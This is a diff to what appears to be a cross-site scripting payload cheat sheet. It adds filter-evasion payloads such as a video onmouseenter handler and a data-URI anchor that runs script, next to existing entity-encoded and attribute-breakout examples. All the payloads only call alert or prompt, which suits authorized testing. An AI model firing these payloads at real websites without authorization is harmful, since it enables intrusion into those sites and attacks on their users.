@@ -20,10 +20,11 @@ If you just need to break out for Proof of Concept and can't use a > to close yo
 ```html
 " onclick="prompt(1)
 ```
-
+WAF got you down?
 ```html
 <body onpageshow="prompt(123)">
 <details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
+<video onmouseenter=prompt(123)>
 ```
 
 Don't forget the injection might not be a form tag but in the javascript.
@@ -63,4 +64,9 @@ When the text is forced UPPERCASE
 ==============
 ```html
 <IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
+```
+Just for fun
+==============
+```html
+<a/href="data:text/html;charset=utf-8,<script>alert(123)</script>">Just Interesting</a>
 ```
